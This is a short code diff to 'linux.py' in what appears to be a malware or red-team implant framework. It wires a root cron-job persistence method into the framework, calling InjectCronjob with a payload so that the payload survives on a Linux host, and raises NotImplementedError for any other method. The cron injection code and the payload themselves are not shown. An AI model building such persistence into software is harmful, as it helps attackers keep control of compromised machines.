@@ -4,6 +4,7 @@ linux.py: Linux-specific persistence logic.
 
 from .base import Persistence
 from .linux_utilities.persistence_methods import LinuxPersistenceMethods
+from .linux_utilities.rootCronJob import InjectCronjob
 
 class LinuxPersistence(Persistence):
     """
@@ -46,6 +47,8 @@ class LinuxPersistence(Persistence):
         method = self.configured_persistence_method()
 
         if method == LinuxPersistenceMethods.ROOTCRONJOB.value:
-            
+            InjectCronjob(self.payload).injectRoot()
+            return
 
-        super().install()
+        raise NotImplementedError(f"Method {method} not implemented.")
+        # super().install()
